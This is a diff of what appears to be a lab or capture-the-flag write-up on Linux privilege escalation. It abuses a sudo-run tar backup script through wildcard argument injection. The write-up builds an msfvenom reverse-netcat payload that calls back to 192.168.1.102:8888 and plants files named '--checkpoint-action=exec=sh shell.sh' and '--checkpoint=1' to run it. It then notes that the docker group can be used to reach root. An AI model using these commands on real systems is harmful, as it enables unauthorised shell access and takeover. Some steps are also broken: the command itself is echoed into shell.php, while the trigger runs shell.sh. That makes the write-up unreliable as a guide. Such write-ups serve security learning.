@@ -1,7 +1,8 @@
 Ok, I checked what we can sudo: sudo -l
 We can sudo as another user script in /opt/backups/backup.sh. This script is running tar cf /opt/backups/backup.tar
 
-This script is taking a backup.tar of everything in backup directory. We create msfvenom reverse netcat
+This script is taking a backup.tar of everything in backup directory. So if we create a reverse shell in this directory, this script just will execute this file
+We create msfvenom reverse netcat
 msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R
 
 After it is created I copied output and executed on the victim machine: echo "msfvenom -p cmd/unix/reverse_netcat lhost=192.168.1.102 lport=8888 R" > shell.php
@@ -9,3 +10,6 @@ I just created a file with reverse netcat, which will be backuped in this direct
 
 
 echo "" > "--checkpoint-action=exec=sh shell.sh"
+echo "" > --checkpoint=1
+
+O opened a netcat session and I then i became michael user, michael is in docker group, and I know how to easy gain a root by this
